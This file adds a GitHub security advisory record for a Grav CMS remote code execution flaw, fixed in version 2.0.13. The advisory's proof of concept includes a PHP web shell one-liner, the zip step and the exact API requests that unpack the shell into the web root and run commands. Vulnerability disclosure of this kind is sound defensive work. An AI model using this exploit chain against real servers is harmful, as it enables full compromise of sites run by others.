@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-r94f-hx44-8jqf",
+  "modified": "2026-09-17T20:45:57Z",
+  "published": "2026-09-17T20:45:57Z",
+  "aliases": [
+    "CVE-2026-72819"
+  ],
+  "summary": "Grav CMS vulnerable to remote code execution via .zip file upload",
+  "details": "### Summary\n\nA logged-in user can run any command on the server. A settings field can fill itself by calling one of Grav's built-in routines, and a safety check is supposed to allow only harmless ones. The check only recognises a routine when its name is written as one piece of text; named as a pair of values instead, it is not examined at all and is passed as safe. Pointing such a field at the routine that unpacks ZIP archives writes a PHP file from an uploaded archive into the site's public folder, which the server then runs.\n\n### Details\n\nThe check rejects known-dangerous routines and, for those belonging to a component, allows only a short approved list. Both of those cases only apply when the name arrives as a single string. The same routine can be named as a pair (the component and the routine inside it), and in that form the check matches neither case, skips both lists and answers \"safe\". Grav then calls it, with arguments the attacker supplies in the same field. Any routine shipped with Grav becomes callable.\n\nThe one used here is what Grav runs when installing a plugin from an archive. It takes an archive and a destination folder. It does check the names of the files inside, so an archive cannot escape with `../`, but the destination is used exactly as given, so naming the folder the website is served from drops the contents there. Getting the archive in is trivial: ZIP is an accepted upload type and the files inside are never examined, so an archive containing a PHP file uploads as ordinary media to a predictable address.\n\nEverything is set up over the web. Saving a plugin's settings stores the values as sent, and the Flex Objects plugin treats each entry of its own directory list as the address of a file describing fields. Pointing that list at the settings file being saved makes one file act as both, so the malicious field is created through a normal settings save with no file edited on the server.\n\n### PoC\n\n1. Log in at `http://TARGET/login` (or `/admin`). The session cookie is the only credential needed below.\n\n2. Build and upload the zip file. In the panel this is the Media tab; it is stored unchanged at `/user/media/evil.zip`.\n\n   Zip the shell.php file with the php code mentioned below:\n   ```\n   shell.php:  <?php system($_GET['c']); ?>\n   zip evil.zip shell.php\n   ```\n\n3. Send the request (attach your Cookie and X-API-Token):\n\n   ```\n   PATCH /api/v1/config/plugins/flex-objects\n   Content-Type: application/json\n\n   {\n     \"directories\": [\"user/config/plugins/flex-objects.yaml\"],\n     \"title\": \"Pwn\",\n     \"type\": \"flex-objects\",\n     \"config\": { \"data\": {\n       \"object\":     \"Grav\\\\Common\\\\Flex\\\\Types\\\\Generic\\\\GenericObject\",\n       \"collection\": \"Grav\\\\Common\\\\Flex\\\\Types\\\\Generic\\\\GenericCollection\",\n       \"index\":      \"Grav\\\\Common\\\\Flex\\\\Types\\\\Generic\\\\GenericIndex\",\n       \"storage\": { \"class\": \"Grav\\\\Framework\\\\Flex\\\\Storage\\\\SimpleStorage\",\n                    \"options\": { \"formatter\": {\"class\": \"Grav\\\\Framework\\\\File\\\\Formatter\\\\JsonFormatter\"},\n                                 \"folder\": \"user-data://flex-objects/pwn.json\" } } } },\n     \"form\": { \"validation\": \"loose\", \"fields\": {\n       \"name\": {\"type\": \"text\", \"label\": \"Name\"},\n       \"pwn\":  {\"type\": \"text\", \"label\": \"pwn\",\n                \"data-default@\": [[\"Grav\\\\Common\\\\GPM\\\\Installer\", \"unZip\"],\n                                  \"user/media/evil.zip\",\n                                  \"/absolute/path/to/grav-docroot\"]} } }\n   }\n   ```\n\n4. Trigger it. In the panel, open the new directory and add an object. As a request (attach your Cookie and X-API-Token):\n\n   ```\n   POST /api/v1/flex-objects/flex-objects\n   Content-Type: application/json\n\n   {\"name\": \"x\"}\n   -> 201\n   ```\n\n5. Open the file that was written:\n\n   ```\n   http://TARGET/shell.php?c=id\n   -> PWNED:uid=1000(kali) gid=1000(kali) ...\n   ```\n\n### Impact\n\nRemote code execution by a logged-in user, so the whole server is compromised. Commands run as the web server's account.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.13"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-r94f-hx44-8jqf"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-72819"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/grav-cms-before-remote-code-execution-via-zip-upload"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-09-17T20:45:57Z",
+    "nvd_published_at": null
+  }
+}
